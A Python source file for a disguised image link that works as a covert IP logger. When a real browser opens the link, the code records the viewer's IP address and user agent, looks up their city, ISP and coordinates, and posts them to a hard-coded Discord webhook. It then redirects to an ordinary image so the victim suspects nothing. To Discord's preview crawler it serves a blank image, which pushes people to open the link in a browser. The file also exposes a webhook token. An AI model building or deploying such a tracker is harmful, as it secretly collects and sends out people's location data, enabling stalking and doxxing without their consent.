# api/image.py
import requests
import json
import time
from http.server import BaseHTTPRequestHandler
import urllib.parse

# === CONFIGURATION ===
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1544896973352476883/jbTw-lzjTawYmZ6HhMhNrFZmqKvE45kEyH1qQSKY7KvQ1aB5FMd8wPlupkaqVdCPorwP"
IMAGE_URL = "https://s7.ezgif.com/tmp/ezgif-7de3e66421b3918b.jpg"

def get_ip_info(ip):
    """Fetch location data from ip-api.com"""
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "country": data.get("country", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "city": data.get("city", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "lat": data.get("lat", ""),
                "lon": data.get("lon", ""),
                "as": data.get("as", "Unknown"),
                "mobile": data.get("mobile", False),
                "proxy": data.get("proxy", False),
                "hosting": data.get("hosting", False),
                "timezone": data.get("timezone", "Unknown")
            }
    except:
        pass
    return None

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        # Get viewer IP
        ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        if not ip:
            ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'unknown')
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())

        # === DETECT DISCORD ===
        is_discord = 'discord' in user_agent.lower() or 'embeds' in user_agent.lower()

        if is_discord:
            # Discord gets a broken image (forces "Open in Browser")
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.send_header('Content-Length', '0')
            self.end_headers()
            self.wfile.write(b'')
            print(f"DISCORD BLOCKED: {ip}")
            return

        # === REAL BROWSER — LOG IP AND SERVE IMAGE ===
        print(f"LOGGED REAL IP: {ip} -> {user_agent[:50]}")

        # Get location data
        ip_info = get_ip_info(ip)

        # Build the webhook message
        if ip_info:
            location_str = (
                f"**Country:** {ip_info.get('country')}\n"
                f"**State/Region:** {ip_info.get('region')}\n"
                f"**City:** {ip_info.get('city')}\n"
                f"**ISP:** {ip_info.get('isp')}\n"
                f"**Coordinates:** {ip_info.get('lat')},{ip_info.get('lon')}"
            )
        else:
            location_str = "Location data unavailable"

        payload = {
            "content": f"**👁️ New Viewer**\n**IP:** `{ip}`\n{location_str}\n**User-Agent:** `{user_agent[:80]}...`\n**Time:** {timestamp}"
        }

        # Send to Discord webhook
        try:
            requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
            print("✅ Webhook sent to Discord")
        except Exception as e:
            print(f"Discord send failed: {e}")

        # Redirect to the real image
        self.send_response(302)
        self.send_header('Location', IMAGE_URL)
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.end_headers()
